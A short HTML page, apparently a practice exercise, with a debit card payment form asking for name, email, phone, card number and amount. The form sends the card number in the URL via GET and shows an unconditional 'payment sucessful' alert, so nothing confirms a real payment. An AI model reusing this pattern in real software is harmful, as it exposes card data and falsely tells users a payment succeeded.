<!DOCTYPE html>
<html>
  <head>
    <title>Debit Card Payment</title>
<link rel="stylesheet" href="payment4.css">
  </head>
  <body>
    <h1>debit Card Payment</h1>
    <form action="slog.html" method="get">
      <label for="name">Name on Card</label>
      <input type="text" id="name" name="name" required>
      
      <label for="email">Email</label>
      <input type="email" id="email" name="email" required>
      
      <label for="tel">Phone Number</label>
      <input type="tel" id="tel" name="tel" required>
      
      <label for="card">Debit Card Number</label>
      <input type="text" id="card" name="card" required>
      
      <label for="amount">Amount</label>
      <input type="number" id="amount" name="amount" required>
      
      <input type="submit" value="Submit Payment" onclick="alert('payment sucessful')">

    </form>
  </body>
</html>
